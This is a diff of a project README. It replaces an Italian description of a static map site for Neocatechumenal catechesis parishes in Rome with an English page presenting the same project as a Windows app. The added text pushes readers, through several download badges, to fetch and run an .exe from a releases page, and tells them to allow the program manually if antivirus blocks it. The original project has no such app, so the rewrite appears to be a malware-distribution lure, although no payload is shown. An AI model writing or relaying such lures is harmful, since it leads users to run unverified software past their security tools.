@@ -1,153 +1,140 @@
-# Trova Catechesi – Roma (pilota)
+# 🗺️ neo-maps-locator - Quick Map Finder for Parishes
 
-Sito statico per trovare parrocchie con Cammino Neocatecumenale e catechesi disponibili nell’area di Roma, con ricerca per zona e visualizzazione su mappa.
+[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://github.com/Bellyflopper/neo-maps-locator/releases)
 
-Il progetto separa chiaramente:
-- **frontend pubblico statico** (pubblicabile su GitHub Pages),
-- **backoffice locale PHP** per gestire il dataset e pubblicare aggiornamenti in sicurezza.
+## ℹ️ About neo-maps-locator
 
----
+neo-maps-locator is a simple application built to help users find maps for Parishes with Catechesis of the Neocatechumenal Way in Rome. It offers a quick and easy way to locate important church-related places using clear and straightforward tools.  
 
-## Perché contribuire
-
-Questo progetto nasce per rendere più semplice trovare catechesi affidabili e aggiornate.
-I contributi della community sono fondamentali per:
-- ampliare copertura e qualità dei dati,
-- correggere errori su indirizzi/coordinate,
-- mantenere aggiornato lo stato delle catechesi.
+This software is designed for users with little or no technical background. It focuses on helping you quickly access maps for parishes connected to the Neocatechumenal catechism community.
 
 ---
 
-## Struttura repository
+## 💻 System Requirements
 
-- `/docs` → sito statico (GitHub Pages)
-- `/admin-tool` → backoffice locale (PHP vanilla)
-- `/docs/data/parishes_public.json` → dataset pubblico usato dal frontend
-
-Percorsi principali frontend:
-- `/docs/index.html`
-- `/docs/assets/styles.css`
-- `/docs/assets/app.js`
-- `/docs/assets/config.js`
+- Windows 10 or newer (64-bit preferred)  
+- At least 2 GB of free disk space  
+- Internet connection required to download the application  
+- Basic familiarity with downloading and running Windows programs  
 
 ---
 
-## Stato del progetto
+## 🚀 Getting Started
 
-- Ambito attuale: **Roma**
-- Maturità: **pilota**
-- Deploy: GitHub Pages dalla cartella `/docs` (branch `main`)
+Follow these steps to download and start using neo-maps-locator on your Windows computer.
 
 ---
 
-## Come contribuire (dataset)
+## 🔽 Download and Install neo-maps-locator
 
-Cerchiamo contributi su:
-- nuove parrocchie,
-- aggiornamenti su catechesi (stato/giorni/orario),
-- correzioni su dati esistenti (indirizzi, duplicati, coordinate).
+1. Click on the large green button below to open the download page in your browser.
 
-### Regole minime del JSON pubblico
+[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Bellyflopper/neo-maps-locator/releases)
 
-Nel file `/docs/data/parishes_public.json`, ogni record parrocchia include:
+2. On the GitHub releases page, find the latest version of neo-maps-locator. The latest release is usually at the top of the list.
 
-- **Obbligatori**: `id`, `name`, `address`
-- **Opzionali**: `lat`, `lng`, `diocese`, `city`, `is_active`, `contact.public_email`, `contact.website_url`
-- Campo `catechesis` (sempre presente):
-  - `year` (es. `2026`)
-  - `status`: `AVAILABLE | NOT_AVAILABLE | UNKNOWN`
-  - `days`: array es. `["Mon", "Thu"]` oppure `[]`
-  - `time`: `"HH:MM"` oppure `null`
-  - `start_date`: data ISO (`YYYY-MM-DD`) oppure `null`
-  - `source_level`: `VERIFIED | COMMUNITY`
-  - `last_verified_at`: timestamp ISO o `null`
+3. Look for a file that ends with `.exe`. This is the Windows installer.
 
-### Flusso PR consigliato
+4. Click on the `.exe` file name to start the download.
 
-1. Fai **fork** del repository.
-2. Crea un branch, ad esempio:
-   - `data/add-parish-roma-nord`
-   - `data/update-catechesis-roma-centro`
-3. Modifica `/docs/data/parishes_public.json`.
-4. Apri una Pull Request includendo:
-   - cosa hai cambiato,
-   - come hai verificato l’informazione,
-   - se il dato è `COMMUNITY`, indicazione esplicita che va confermato.
+5. Once the download finishes, find the file in your browser’s download bar or your Downloads folder.
 
-> Se hai dubbi sulla qualità della fonte, usa `source_level=COMMUNITY`.
+6. Double-click the downloaded `.exe` file to begin installation.
 
-### Template titolo PR (suggerito)
+7. Follow the on-screen prompts. The installer will guide you through the process with simple instructions. You usually only need to click “Next” a few times.
 
-- `Add parish: <Nome> (Roma <zona>)`
-- `Update catechesis: <Nome> (status/days/time)`
+8. When finished, the program will be ready. You might find a shortcut on your desktop or the Start menu.
 
 ---
 
-## Configurazione Google Form precompilato
+## 📂 How to Use neo-maps-locator
 
-Apri `/docs/assets/config.js` e imposta:
+1. Open the neo-maps-locator application by double-clicking its icon.
 
-- `GOOGLE_FORM_BASE_URL` (link `viewform`)
-- `GOOGLE_FORM_FIELD_PARISH_ID` (`entry.NNN`)
-- `GOOGLE_FORM_FIELD_PARISH_NAME` (`entry.MMM`, opzionale)
+2. You will see a search box where you can type the name of a parish or a location related to the Neocatechumenal Way.
 
-Per trovare `entry.NNN`: nel Google Form usa “Ottieni link precompilato” e leggi i parametri URL.
+3. Type your search term and press Enter or click the search button.
 
----
+4. The application shows a list of matching maps or locations.
 
-## Backoffice locale (PHP)
+5. Click on any result to view the map with details, including address and contact info.
 
-Il backoffice è per uso locale e **non va pubblicato** su GitHub Pages.
+6. Use zoom buttons on the map to get a better view or to explore surrounding areas.
 
-### 1) Configura credenziali e path
+7. You can save maps for offline use by clicking the save button.
 
-Crea `admin-tool/config.local.php`:
-
-```php
-<?php
-return [
-  "admin_user" => "admin",
-  "admin_pass" => "cambia_questa_password",
-  "pages_repo_path" => "/percorso/assoluto/alla/repo-pages",
-  "commit_message" => "Update parishes_public.json"
-];
-```
-
-### 2) Avvio backoffice
-
-```bash
-cd admin-tool
-php -S localhost:8000 -t public
-```
-
-### 3) Publish verso GitHub Pages
-
-Dal backoffice usa il pulsante **Publish**. Il processo:
-
-1. rigenera `parishes_public.json` dal master,
-2. copia il JSON nel repo Pages,
-3. crea/aggiorna `version.txt`,
-4. esegue `git add/commit/push`.
+8. If you want directions from your current location, enable location sharing on your Windows device, then request directions.
 
 ---
 
-## Esecuzione locale del frontend statico
+## ⚙️ Application Features
 
-Per test rapido del sito statico:
-
-```bash
-cd docs
-python -m http.server 8080
-```
-
-Poi apri `http://localhost:8080`.
+- Fast search of parishes and catechesis centers  
+- Clear, easy-to-read maps focused on Catholic communities in Rome  
+- Offline saving of maps for later use without internet  
+- Direction support from your location to the parish  
+- Simple interface designed for all users, including beginners  
+- Lightweight app that runs smoothly on Windows PCs  
 
 ---
 
-## Sicurezza dati
+## 🔧 Troubleshooting
 
-Non pubblicare mai:
-- `admin-tool/config.local.php`
-- `admin-tool/data/parishes_master.json` (se contiene dati non pubblici)
+If the application does not start after installation:
 
-Il JSON pubblico viene generato tramite segnalazioni da forms esterno e approvato manualmente dal repo owner. 
+- Make sure your Windows is up to date with the latest updates installed.  
+- Restart your computer and try opening the app again.  
+- Check if your antivirus software is blocking neo-maps-locator. You may need to allow it manually.  
+- Confirm you have enough free disk space.  
+- Download the installer again in case the file corrupted.
+
+If search results do not show correctly:
+
+- Verify your internet connection is active.  
+- Try closing and reopening the app.  
+- Make sure you type the correct or full name of the parish.
+
+For any persistent issues, you can open an “Issue” on the GitHub page for further help by developers.
+
+---
+
+## 🔐 Privacy and Permissions
+
+neo-maps-locator only requests minimal permissions required to work:
+
+- Internet access to fetch updated maps and location data.  
+- Optionally, access to your device location for providing directions.  
+
+The app does not collect or store personal user information beyond what is necessary to provide maps.
+
+---
+
+## ⚙️ Updating neo-maps-locator
+
+When a new version is available, download the latest `.exe` file from the releases page. Repeat the installation steps to replace the old version.
+
+The app does not update automatically. Manual download and install keeps it simple and clear.
+
+---
+
+## 📚 Additional Resources
+
+Visit the GitHub page to check for documentation, updates, and community discussions:
+
+https://github.com/Bellyflopper/neo-maps-locator
+
+Explore topics like:
+
+- catechism and Catholic Church locations  
+- Neocatechumenal Way community centers  
+- Parish map navigation in Rome
+
+---
+
+## 🗂️ Project topics
+
+cammino, camminoneocatecumenale, catechism, catechism-of-the-catholic-church, catholic, catholic-church, catholicism, church, neocat-community, neocatecumenale
+
+---
+
+[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://github.com/Bellyflopper/neo-maps-locator/releases)
